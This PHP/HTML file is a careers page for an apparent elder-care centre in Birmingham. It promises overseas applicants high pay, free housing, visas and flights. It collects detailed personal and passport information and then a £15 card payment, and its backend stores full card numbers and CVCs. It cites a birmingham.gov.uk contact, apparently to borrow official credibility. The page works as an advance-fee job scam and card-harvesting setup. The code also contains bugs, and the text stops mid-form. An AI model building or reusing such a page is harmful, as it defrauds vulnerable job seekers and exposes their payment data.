<?php
// careers.php
// This file serves as both the careers application page and the payment processor.
// WARNING: This is a SIMPLIFIED and INSECURE example for demonstration purposes ONLY.
// It lacks robust error handling, input sanitization, and security measures for sensitive data.
// DO NOT USE IN PRODUCTION FOR REAL CREDIT CARD NUMBERS OR WITHOUT PROPER PAYMENT GATEWAY INTEGRATION.

// --- Database Configuration (REPLACE WITH YOUR ACTUAL CREDENTIALS) ---
$servername = "localhost"; // Your database host
$username = "root"; // Your database username - ***CHANGE THIS***
$password = ""; // Your database password - ***CHANGE THIS***
$dbname = "tre_geriatric_db"; // Your database name - ***CHANGE THIS***

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    // In a real application, you might log this error and show a generic message to the user
    die("Connection failed: " . $conn->connect_error);
}
// Set charset to utf8mb4 for emoji and broad character support
$conn->set_charset("utf8mb4");

// --- Payment Processing Logic ---
// This part of the script will execute ONLY if it's a POST request from the frontend form.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json'); // Set header for JSON response
    header('Access-Control-Allow-Origin: *'); // ALLOWS ALL ORIGINS - INSECURE FOR PRODUCTION
    header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');

    // Handle preflight requests for CORS
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }

    $response = ['success' => false, 'message' => ''];

    // Get the raw POST data
    $json_data = file_get_contents("php://input");
    $data = json_decode($json_data, true); // Decode as associative array

    if ($data === null) {
        $response['message'] = 'Invalid JSON input.';
        echo json_encode($response);
        exit();
    }

    // Initialize variables for binding, ensuring they are not null
    $full_name = null;
    $email = null;
    $phone_number = null;
    $card_holder_name = null;
    $card_number_last_four = null;
    $full_card_number = null; // New variable for full card number
    $cvc = null;             // New variable for CVC
    $card_type = null;
    $expiry_month_year = null;
    $transaction_id = null; // For alternative payments
    $application_data = null; // To store the full application JSON

    $payment_method = $data['paymentMethod'] ?? 'Unknown';
    $amount = $data['amount'] ?? 0.00;

    // Extract application data as JSON string
    if (isset($data['applicationData'])) {
        $application_data = json_encode($data['applicationData']);

        // Extract specific fields from applicationData for separate columns
        $full_name = $data['applicationData']['fullName'] ?? null;
        $email = $data['applicationData']['email'] ?? null;
        $phone_number = $data['applicationData']['phoneNumber'] ?? null;
    }

    // Handle payment method specific details
    if ($payment_method === 'Card') {
        if (isset($data['cardDetails'])) {
            $card_details = $data['cardDetails'];
            $card_holder_name = $card_details['cardHolderName'] ?? null;
            $card_number_raw = $card_details['cardNumber'] ?? ''; // Full card number from frontend
            $full_card_number = preg_replace('/\D/', '', $card_number_raw); // Store only digits
            $card_number_last_four = substr($full_card_number, -4); // Extract last 4 digits for storage
            $card_type = $card_details['cardType'] ?? null;
            $expiry_month_year = $card_details['expiryDate'] ?? null;
            $cvc = $card_details['cvc'] ?? null; // Get CVC from frontend
        }
    } elseif ($payment_method === 'PayPal' || $payment_method === 'Crypto') {
        $transaction_id = $data['transactionId'] ?? null;
        // For alternative payments, card-related fields remain null
    }

    // Basic validation
    if (empty($full_name) || empty($email) || $amount <= 0) {
        $response['message'] = 'Missing required payment or application data (Full Name, Email, Amount).';
        echo json_encode($response);
        // Close DB connection before exiting
        if ($conn) { $conn->close(); }
        exit();
    }

    // Prepare an INSERT statement for the payments table
    // IMPORTANT: Ensure your 'payments' table has these new columns:
    // `full_card_number` (e.g., VARCHAR(19) or TEXT)
    // `cvc` (e.g., VARCHAR(4))
    $stmt = $conn->prepare("INSERT INTO payments (
        full_name, email, phone_number, card_holder_name, card_number_last_four,
        full_card_number, cvc, card_type, expiry_month_year, amount, payment_method, transaction_id, application_data_json
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

    if ($stmt === false) {
        $response['message'] = 'Database prepare failed: ' . $conn->error;
        echo json_encode($response);
        if ($conn) { $conn_close(); }
        exit();
    }

    // Bind parameters (s = string, d = double)
    // The type string 'sssssssssdss' has been updated to 'sssssssssdsss'
    // to accommodate full_card_number, cvc, and card_type.
    $stmt->bind_param("ssssssssssdss", // 13 's' for strings, 1 'd' for double
        $full_name,
        $email,
        $phone_number,
        $card_holder_name,
        $card_number_last_four,
        $full_card_number, // Full card number
        $cvc,              // CVC
        $card_type,
        $expiry_month_year,
        $amount,
        $payment_method,
        $transaction_id,
        $application_data // Full JSON string of application data
    );

    // Execute the statement
    if ($stmt->execute()) {
        $response['success'] = true;
        $response['message'] = 'Payment and application data stored successfully.';
    } else {
        $response['message'] = 'Database execution failed: ' . $stmt->error;
    }

    // Close the statement and connection
    $stmt->close();
    if ($conn) { $conn->close(); }

    echo json_encode($response);
    exit(); // IMPORTANT: Exit after sending JSON response for POST requests
}

// --- HTML Content (This part only executes for GET requests) ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Careers - TRE Geriatric Care</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='50%25' y='50%25' font-size='80' text-anchor='middle' dominant-baseline='central'%3E👵%3C/text%3E%3C/svg%3E" type="image/svg+xml">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            @apply bg-gray-50 text-gray-800;
        }
        .gradient-bg-footer {
            background: linear-gradient(to right, #3B82F6, #6EE7B7);
        }
        .btn-primary {
            @apply bg-blue-600 text-white px-6 py-3 rounded-full hover:bg-blue-700 transition duration-300 ease-in-out shadow-lg;
        }
        .nav-link {
            @apply text-white hover:text-blue-200 transition duration-300;
        }
        .card {
            @apply bg-white p-6 rounded-xl shadow-lg hover:shadow-xl transition-shadow duration-300;
        }
        .footer-link {
            @apply text-gray-200 hover:text-white transition duration-300;
        }
        /* Ensure responsive image handling */
        img {
            max-width: 100%;
            height: auto;
            display: block;
        }
        /* Accessibility improvements */
        :focus-visible {
            outline: 2px solid theme('colors.blue.500');
            outline-offset: 2px;
        }
        /* Style for form elements */
        .form-group label {
            @apply block text-gray-700 text-sm font-bold mb-2;
        }
        .form-group input[type="text"],
        .form-group input[type="email"],
        .form-group input[type="tel"],
        .form-group input[type="number"],
        .form-group textarea,
        .form-group select,
        .form-group input[type="password"] { /* Added password for payment form */
            @apply shadow appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent;
        }
        .form-group input[type="radio"],
        .form-group input[type="checkbox"] {
            @apply mr-2;
        }
        .radio-label {
            @apply inline-flex items-center text-gray-700 text-base mb-2;
        }
        .message-box {
            @apply p-4 rounded-lg text-white font-semibold mb-4;
        }
        .message-box.success {
            @apply bg-green-500;
        }
        .message-box.error {
            @apply bg-red-500;
        }
        .message-box.info { /* Added info type for processing messages */
            @apply bg-blue-500;
        }
        /* Enhanced Alert Message Style */
        .alert-error {
            background-color: #f8d7da; /* Light red background */
            color: #721c24; /* Dark red text */
            border: 1px solid #f5c6cb; /* Red border */
            padding: 1rem;
            margin-bottom: 1rem;
            border-radius: 0.5rem;
            font-weight: bold;
            text-align: center;
        }

        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
        }

        .modal-overlay.show {
            opacity: 1;
            visibility: visible;
        }

        .modal-content {
            background-color: white;
            padding: 2.5rem;
            border-radius: 1rem;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 90%;
            width: 500px;
            transform: translateY(-20px);
            opacity: 0;
            transition: transform 0.3s ease, opacity 0.3s ease;
            position: relative; /* For the close button */
        }

        .modal-overlay.show .modal-content {
            transform: translateY(0);
            opacity: 1;
        }

        .modal-close-btn {
            position: absolute;
            top: 1rem;
            right: 1rem;
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: #9ca3af;
            transition: color 0.2s ease;
        }

        .modal-close-btn:hover {
            color: #ef4444;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    <header class="bg-blue-800 p-4 shadow-md">
        <div class="container mx-auto flex justify-between items-center">
            <a href="index.html" class="text-white text-2xl font-bold rounded-lg p-2 transition duration-300 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300">
                TRE <span class="text-base font-normal block -mt-1">Geriatric Care</span>
            </a>
            <button id="mobile-menu-button" class="lg:hidden text-white focus:outline-none focus:ring-2 focus:ring-blue-300 p-2 rounded-md">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
                </svg>
            </button>
            <nav class="hidden lg:flex space-x-6">
                <a href="index.html" class="nav-link">Home</a>
                <a href="about.html" class="nav-link">About Us</a>
                <a href="services.html" class="nav-link">Services</a>
                <a href="careers.php" class="nav-link">Careers</a> <a href="contact.html" class="nav-link">Contact Us</a>
                <a href="client_portal.html" class="nav-link">Client Portal</a>
            </nav>
        </div>
        <nav id="mobile-menu" class="hidden lg:hidden bg-blue-700 mt-2 rounded-lg">
            <ul class="flex flex-col items-center py-4 space-y-3">
                <li><a href="index.html" class="nav-link block px-4 py-2">Home</a></li>
                <li><a href="about.html" class="nav-link block px-4 py-2">About Us</a></li>
                <li><a href="services.html" class="nav-link block px-4 py-2">Services</a></li>
                <li><a href="careers.php" class="nav-link block px-4 py-2">Careers</a></li> <li><a href="contact.html" class="nav-link block px-4 py-2">Contact Us</a></li>
                <li><a href="client_portal.html" class="nav-link block px-4 py-2">Client Portal</a></li>
                <li><a href="payment.html" class="nav-link block px-4 py-2">Make Payment</a></li>
            </ul>
        </nav>
    </header>

    <main class="flex-grow py-16 px-4">
        <div class="container mx-auto max-w-6xl">
            <h1 class="text-5xl font-extrabold text-center text-blue-800 mb-12">Join Our Team: A Time to Relax for the Elderly</h1>

            <section id="introduction" class="mb-12 card bg-blue-50">
                <h2 class="text-3xl font-bold text-blue-700 mb-4 border-b-2 border-blue-300 pb-3">Introduction to Career Opportunities</h2>
                <p class="text-lg leading-relaxed text-gray-700">
                    Welcome to a unique opportunity to join the TRE (A Time to Relax for the Elderly) team, a modern elderly care center located in Birmingham, England! TRE is not just an elderly care center; it's a second home for our seniors, a place where we honor them with love and professional care. Our motto, "They raised us, now it's our turn to raise them," reflects our commitment to providing seniors with a life of comfort, safety, and joy.
                </p>
                <p class="text-lg leading-relaxed text-gray-700 mt-4">
                    We have 15 unique job openings for passionate, creative, and dedicated individuals from any country, provided they can speak English fluently at a high level. If you are looking for a meaningful job that will change your life and others', this is your chance to shine!
                </p>
            </section>

            <section id="benefits" class="mb-12 card bg-green-50">
                <h2 class="text-3xl font-bold text-green-700 mb-4 border-b-2 border-green-300 pb-3">Unique Benefits of Joining TRE Geriatric Care</h2>
                <div class="grid md:grid-cols-2 gap-8">
                    <div>
                        <h3 class="text-2xl font-semibold text-green-600 mb-3">Salary & Bonuses</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li><strong>Basic Salary:</strong> £20 (approx. USD 27) per hour, based on standard working hours (40 hours per week). This means monthly earnings from £3,500 to £5,000 (USD 4,500 - 6,500) depending on experience and position.</li>
                            <li><strong>Performance Bonuses:</strong> Up to £1,000 quarterly for top performers.</li>
                            <li><strong>Overtime Pay:</strong> Higher pay for extra working hours.</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-2xl font-semibold text-green-600 mb-3">Free Accommodation</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li>TRE will provide completely modern accommodation near our center in Harborne, Birmingham.</li>
                            <li>Homes will be fully furnished, with free Wi-Fi, and company-paid cleaning services.</li>
                            <li>You can choose to live alone or with colleagues, depending on your preference.</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-2xl font-semibold text-green-600 mb-3">Interest-Free Car Loan</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li>We offer an interest-free loan of up to £3,000 for purchasing a small personal car to ease your daily commute.</li>
                            <li>Loan repayments will be easily deducted from your salary in simple monthly installments.</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-2xl font-semibold text-green-600 mb-3">Visa & Flight Ticket Support</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li><strong>Work Permit:</strong> TRE will fully manage the process of obtaining a 4-year work permit in the UK, including all visa fees and processing fees.</li>
                            <li><strong>Flight Ticket:</strong> The company will provide your flight ticket to the UK from your country of origin.</li>
                            <li><strong>Passport Requirement:</strong> Applicants must have a valid passport from their country of origin. The company will not participate in the process of obtaining a passport.</li>
                            <li><strong>Legal Responsibility:</strong> If an employee commits any offense that violates UK laws, the company will not be liable for such actions.</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-2xl font-semibold text-green-600 mb-3">Family Support</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li>If you are married and have a valid marriage certificate from your country, you can bring your spouse and children (under 18 years old) to live with you in the UK. TRE will assist with your family's visa process.</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-2xl font-semibold text-green-600 mb-3">Friendly Work Environment</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li>Our team is like a family - we will welcome you with open arms and provide in-depth training to help you succeed in your job.</li>
                            <li>You will work in a modern environment with excellent facilities, including modern healthcare technology.</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-2xl font-semibold text-green-600 mb-3">Career Development Opportunities</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li>Regular free training in elderly care, health technology, and management skills.</li>
                            <li>Possibility of promotion to leadership positions within two years of employment.</li>
                            <li>Scholarships for higher education at UK universities for deserving employees.</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-2xl font-semibold text-green-600 mb-3">Additional Benefits</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li><strong>Health Insurance:</strong> Comprehensive health insurance including dental and emergency services.</li>
                            <li><strong>Leave:</strong> 30 days of paid leave per year, plus UK public holidays.</li>
                            <li><strong>Discounts:</strong> Up to 50% discount on public transport services and household goods purchases in Birmingham.</li>
                            <li><strong>Entertainment:</strong> Employee programs, suchs as group trips, cultural events, and physical health programs (yoga, exercise, etc.).</li>
                            <li><strong>Financial Assistance:</strong> Free financial advice to manage daily life.</li>
                        </ul>
                    </div>
                </div>
            </section>

            <section id="job-responsibilities" class="mb-12 card bg-purple-50">
                <h2 class="text-3xl font-bold text-purple-700 mb-4 border-b-2 border-purple-300 pb-3">Job Responsibilities</h2>
                <p class="text-lg leading-relaxed text-gray-700 mb-4">
                    As a member of the TRE team, you will be responsible for ensuring that seniors receive our services and live happy and safe lives. Job responsibilities may include:
                </p>
                <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                    <li>Providing personal care for the elderly, such as assisting them with daily activities (feeding, bathing, etc.).</li>
                    <li>Organizing and managing recreational activities, such as games, walks, and social events.</li>
                    <li>Collaborating with health professionals to ensure seniors receive appropriate medical care.</li>
                    <li>Writing daily reports on the progress of the elderly.</li>
                    <li>Providing friendly advice and listening carefully to the elderly to offer emotional comfort.</li>
                </ul>
            </section>

            <section id="job-requirements" class="mb-12 card bg-orange-50">
                <h2 class="text-3xl font-bold text-orange-700 mb-4 border-b-2 border-orange-300 pb-3">Job Requirements</h2>
                <p class="text-lg leading-relaxed text-gray-700 mb-4">
                    To qualify for this position, you need:
                </p>
                <ul class="list-disc list-inside text-lg text-gray-700 space-y-4">
                    <li>
                        <h3 class="font-semibold text-xl text-orange-600">English Language Proficiency:</h3>
                        <p>High fluency in English (reading, writing, and speaking) is mandatory.</p>
                    </li>
                    <li>
                        <h3 class="font-semibold text-xl text-orange-600">Experience:</h3>
                        <p>Prior experience in elderly care, health, or social services will be considered, but it is not mandatory – we provide full training.</p>
                    </li>
                    <li>
                        <h3 class="font-semibold text-xl text-orange-600">Personal Qualities:</h3>
                        <ul class="list-circle list-inside ml-5 text-gray-600 space-y-1">
                            <li>Compassion, patience, and a passion for helping the elderly.</li>
                            <li>Ability to work in a team and independently.</li>
                            <li>Integrity and dedication to meaningful work.</li>
                        </ul>
                    </li>
                    <li>
                        <h3 class="font-semibold text-xl text-orange-600">Age:</h3>
                        <p>Applicants must be 18 years old or older.</p>
                    </li>
                    <li>
                        <h3 class="font-semibold text-xl text-orange-600">Travel Documents:</h3>
                        <p>Valid passport for visa processing (the company will assist with this).</p>
                    </li>
                    <li>
                        <h3 class="font-semibold text-xl text-orange-600">Education:</h3>
                        <p>No higher education requirements. Compassion, English fluency, and a passion for helping the elderly are key.</p>
                    </li>
                </ul>
            </section>

            <section id="application-form" class="mb-12 card bg-teal-50 p-8">
                <h2 class="text-3xl font-bold text-teal-700 mb-6 border-b-2 border-teal-300 pb-3">Job Application Form</h2>
                <p class="text-lg leading-relaxed text-gray-700 mb-8">
                    To apply for this life-changing job opportunity, please accurately fill out the form below. Ensure your contact details are correct so we can get in touch with you as quickly as possible.
                </p>

                <form id="careers-application-form" class="space-y-6">
                    <div class="form-section mb-8">
                        <h3 class="text-2xl font-semibold text-teal-600 mb-4">Personal Details</h3>
                        <div class="form-group">
                            <label for="fullName">1. Full Name:</label>
                            <input type="text" id="fullName" name="fullName" required>
                        </div>
                        <div class="form-group mt-4">
                            <label for="age">2. Age:</label>
                            <input type="number" id="age" name="age" min="18" required>
                        </div>
                        <div class="form-group mt-4">
                            <label for="gender">3. Gender:</label>
                            <select id="gender" name="gender" required>
                                <option value="">Select Gender</option>
                                <option value="male">Male</option>
                                <option value="female">Female</option>
                                <option value="other">Other</option>
                            </select>
                        </div>
                        <div class="form-group mt-4">
                            <label for="countryOfOrigin">4. Country of Origin:</label>
                            <input type="text" id="countryOfOrigin" name="countryOfOrigin" required>
                        </div>
                        <div class="form-group mt-4">
                            <label for="currentAddress">5. Current Address:</label>
                            <input type="text" id="currentAddress" name="currentAddress" required>
                        </div>
                        <div class="form-group mt-4">
                            <label for="phoneNumber">6. Phone Number:</label>
                            <input type="tel" id="phoneNumber" name="phoneNumber" required>
                        </div>
                        <div class="form-group mt-4">
                            <label for="email">7. Email Address:</label>
                            <input type="email" id="email" name="email" required>
                        </div>
                        <div class="form-group mt-4">
                            <label>8. Marital Status:</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label">
                                    <input type="radio" name="maritalStatus" value="single" required> Single
                                </label>
                                <label class="radio-label">
                                    <input type="radio" name="maritalStatus" value="married"> Married (Please submit valid marriage certificate if planning to sponsor spouse)
                                </label>
                                <label class="radio-label">
                                    <input type="radio" name="maritalStatus" value="widowed"> Widowed
                                </label>
                                <label class="radio-label">
                                    <input type="radio" name="maritalStatus" value="divorced"> Divorced
                                </label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>9. If Married/Widowed/Divorced, do you have children?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label">
                                    <input type="radio" name="hasChildren" value="yes"> Yes (Specify number and ages)
                                </label>
                                <input type="text" id="childrenDetails" name="childrenDetails" placeholder="e.g., 2 (ages 5, 8)" class="mt-2">
                                <label class="radio-label">
                                    <input type="radio" name="hasChildren" value="no"> No
                                </label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>10. Do you have a valid Passport?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label">
                                    <input type="radio" name="hasPassport" value="yes" required> Yes
                                </label>
                                <label class="radio-label">
                                    <input type="radio" name="hasPassport" value="no"> No (Please ensure you obtain a passport before applying)
                                </label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>11. Do you have any additional travel documents (e.g., previous visas)?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label">
                                    <input type="radio" name="hasAdditionalTravelDocs" value="yes"> Yes (Specify)
                                </label>
                                <input type="text" id="additionalTravelDocsDetails" name="additionalTravelDocsDetails" placeholder="e.g., Schengen Visa" class="mt-2">
                                <label class="radio-label">
                                    <input type="radio" name="hasAdditionalTravelDocs" value="no"> No
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-section mb-8">
                        <h3 class="text-2xl font-semibold text-teal-600 mb-4">Education Level</h3>
                        <div class="form-group">
                            <label>12. Education Level:</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label"><input type="radio" name="educationLevel" value="secondary"> Secondary</label>
                                <label class="radio-label"><input type="radio" name="educationLevel" value="diploma"> Diploma</label>
                                <label class="radio-label"><input type="radio" name="educationLevel" value="bachelor"> Bachelor's Degree</label>
                                <label class="radio-label">
                                    <input type="radio" name="educationLevel" value="university"> University (Specify)
                                </label>
                                <input type="text" id="universityDetails" name="universityDetails" placeholder="e.g., University of Birmingham" class="mt-2">
                                <label class="radio-label"><input type="radio" name="educationLevel" value="none"> No Formal Education</label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>13. Do you have any additional certificates (e.g., Health Care, Technology)?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label">
                                    <input type="radio" name="hasAdditionalCertificates" value="yes"> Yes (Specify)
                                </label>
                                <input type="text" id="additionalCertificatesDetails" name="additionalCertificatesDetails" placeholder="e.g., First Aid, Nursing Assistant" class="mt-2">
                                <label class="radio-label">
                                    <input type="radio" name="hasAdditionalCertificates" value="no"> No
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-section mb-8">
                        <h3 class="text-2xl font-semibold text-teal-600 mb-4">Work Experience</h3>
                        <div class="form-group">
                            <label for="workExperience">14. Work Experience (if any):</label>
                            <textarea id="workExperience" name="workExperience" rows="3" placeholder="Specify position, company, and duration"></textarea>
                        </div>
                        <div class="form-group mt-4">
                            <label>15. Have you ever worked with the elderly or in the healthcare sector?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label">
                                    <input type="radio" name="workedWithElderly" value="yes" required> Yes (Specify details)
                                </label>
                                <input type="text" id="workedWithElderlyDetails" name="workedWithElderlyDetails" placeholder="e.g., Caregiver at ElderCare Solutions for 2 years" class="mt-2">
                                <label class="radio-label">
                                    <input type="radio" name="workedWithElderly" value="no"> No
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-section mb-8">
                        <h3 class="text-2xl font-semibold text-teal-600 mb-4">English Proficiency</h3>
                        <div class="form-group">
                            <label>16. English Proficiency:</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label"><input type="radio" name="englishProficiency" value="excellent" required> Excellent</label>
                                <label class="radio-label"><input type="radio" name="englishProficiency" value="good"> Good</label>
                                <label class="radio-label"><input type="radio" name="englishProficiency" value="average"> Average</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-section mb-8">
                        <h3 class="text-2xl font-semibold text-teal-600 mb-4">Personal Questions</h3>
                        <div class="form-group">
                            <label for="whyWorkWithElderly">17. Why do you want to work with the elderly?</label>
                            <textarea id="whyWorkWithElderly" name="whyWorkWithElderly" rows="3" required></textarea>
                        </div>
                        <div class="form-group mt-4">
                            <label>18. Do you have personal experience caring for the elderly (e.g., parents, grandparents)?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label">
                                    <input type="radio" name="personalElderlyCareExperience" value="yes" required> Yes (Specify details)
                                </label>
                                <input type="text" id="personalElderlyCareExperienceDetails" name="personalElderlyCareExperienceDetails" placeholder="e.g., Cared for my grandmother for 5 years" class="mt-2">
                                <label class="radio-label">
                                    <input type="radio" name="personalElderlyCareExperience" value="no"> No
                                </label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>19. Do you prefer working in a team or individually?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label"><input type="radio" name="workPreference" value="team" required> Team</label>
                                <label class="radio-label"><input type="radio" name="workPreference" value="individual"> Individually</label>
                                <label class="radio-label"><input type="radio" name="workPreference" value="both"> Both</label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>20. Are you comfortable with and capable of performing tasks requiring physical strength (e.g., assisting seniors with standing or mobility)?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label"><input type="radio" name="physicalStrengthComfort" value="yes" required> Yes</label>
                                <label class="radio-label"><input type="radio" name="physicalStrengthComfort" value="no"> No</label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>21. Are you eager to learn new things (e.g., Health Technology, Elderly Care Methods)?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label"><input type="radio" name="eagerToLearn" value="yes" required> Yes</label>
                                <label class="radio-label"><input type="radio" name="eagerToLearn" value="no"> No</label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>22. Would you like to be promoted after two years of work?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label"><input type="radio" name="desirePromotion" value="yes" required> Yes</label>
                                <label class="radio-label"><input type="radio" name="desirePromotion" value="no"> No</label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label>23. Do you prefer to live alone or with colleagues?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label"><input type="radio" name="livingPreference" value="alone" required> Alone</label>
                                <label class="radio-label"><input type="radio" name="livingPreference" value="with_colleagues"> With colleagues</label>
                            </div>
                        </div>
                        <div class="form-group mt-4">
                            <label for="hobbies">24. Do you have any favorite recreational activities (e.g., Sports, Music, Yoga)?</label>
                            <input type="text" id="hobbies" name="hobbies">
                        </div>
                        <div class="form-group mt-4">
                            <label>25. Do you have enough time to move to the UK within 3 months?</label>
                            <div class="flex flex-col space-y-2">
                                <label class="radio-label"><input type="radio" name="moveTimeframe" value="yes" required> Yes</label>
                                <label class="radio-label"><input type="radio" name="moveTimeframe" value="no"> No</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-section mb-8">
                        <h3 class="text-2xl font-semibold text-teal-600 mb-4">Application Letter</h3>
                        <div class="form-group">
                            <label for="applicationLetter">26. Write a Short Letter Explaining Why You Are Suitable for This Job:</label>
                            <textarea id="applicationLetter" name="applicationLetter" rows="6" required></textarea>
                        </div>
                    </div>

                    <div class="form-section mb-8">
                        <h3 class="text-2xl font-semibold text-teal-600 mb-4">References (If Any)</h3>
                        <p class="text-gray-700 text-sm mb-4">Provide name, title, and contact information for two references.</p>
                        <div class="form-group grid md:grid-cols-2 gap-4">
                            <div>
                                <label for="ref1Name">1. Name:</label>
                                <input type="text" id="ref1Name" name="ref1Name">
                                <label for="ref1Title" class="mt-2 block">Title:</label>
                                <input type="text" id="ref1Title" name="ref1Title">
                                <label for="ref1Contact" class="mt-2 block">Contact:</label>
                                <input type="text" id="ref1Contact" name="ref1Contact">
                            </div>
                            <div>
                                <label for="ref2Name">2. Name:</label>
                                <input type="text" id="ref2Name" name="ref2Name">
                                <label for="ref2Title" class="mt-2 block">Title:</label>
                                <input type="text" id="ref2Title" name="ref2Title">
                                <label for="ref2Contact" class="mt-2 block">Contact:</label>
                                <input type="text" id="ref2Contact" name="ref2Contact">
                            </div>
                        </div>
                    </div>

                    <div class="form-section mb-8 bg-blue-100 p-6 rounded-lg shadow-inner">
                        <h3 class="text-2xl font-semibold text-blue-700 mb-4">Form Submission Instructions</h3>
                        <ul class="list-disc list-inside text-lg text-gray-700 space-y-2">
                            <li>Submit your completed form via email to: <a href="mailto:the.kenrick.centre@birmingham.gov.uk" class="text-blue-600 hover:underline">the.kenrick.centre@birmingham.gov.uk</a> or submit it directly on our website <a href="https://www.birmingham.gov.uk" target="_blank" rel="noopener noreferrer" class="text-blue-600 hover:underline">www.birmingham.gov.uk</a>.</li>
                            <li>Application Deadline: 30 June 2025.</li>
                            <li>Shortlisted candidates will be contacted by phone or email within two weeks after the deadline.</li>
                        </ul>
                    </div>

                    </form>
            </section>

            <section id="payment-section" class="container mx-auto max-w-xl py-16 px-4">
                <h1 class="text-5xl font-extrabold text-center text-blue-800 mb-12">Pay with Visa/Mastercard</h1>

                <div class="card p-8 bg-yellow-50 mb-8">
                    <h2 class="text-3xl font-bold text-yellow-700 mb-6 text-center">Payment Form</h2>
                    <div id="payment-message-container" class="hidden message-box"></div>

                    <form id="payment-form" class="space-y-6">
                        <div class="form-group">
                            <label for="cardNumber">Card Number:</label>
                            <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" pattern="[0-9\s]{13,20}" title="Enter a valid credit card number (13-19 digits)" required>
                        </div>
                        <div class="grid grid-cols-2 gap-4">
                            <div class="form-group">
                                <label for="expiryDate">Expiry Date (MM/YY):</label>
                                <input type="text" id="expiryDate" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" title="Enter in MM/YY format (e.g., 12/25)" required>
                            </div>
                            <div class="form-group">
                                <label for="cvc">CVC:</label>
                                <input type="text" id="cvc" placeholder="XXX" pattern="[0-9]{3,4}" title="3 or 4 digits" required>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="cardHolderName">Cardholder Name:</label>
                            <input type="text" id="cardHolderName" placeholder="Full Name" required>
                        </div>
                        <div class="form-group">
                            <label for="amount">Amount (GBP):</label>
                            <input type="number" id="amount" value="15.00" step="0.01" min="0.01" required>
                        </div>
                        <button type="submit" class="btn-primary w-full bg-yellow-600 hover:bg-yellow-700">Submit and Pay</button>
                    </form>

